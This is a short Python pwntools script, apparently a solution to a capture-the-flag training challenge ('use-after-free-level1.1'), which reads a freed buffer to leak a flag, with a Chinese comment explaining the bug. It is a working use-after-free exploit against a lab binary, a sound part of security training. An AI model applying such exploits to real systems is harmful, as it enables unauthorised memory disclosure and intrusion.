#!/usr/bin/env python

import pwn

# read_flag中读文件会malloc缓冲区，内容被复制到缓冲区后被free
proc = pwn.process("/challenge/use-after-free-level1.1")
proc.sendline(b'1') # create
proc.sendline(b'0')
proc.send(b'p')
proc.clean()

proc.sendline(b'4') # show
proc.sendline(b'0')

print(proc.recv().decode())
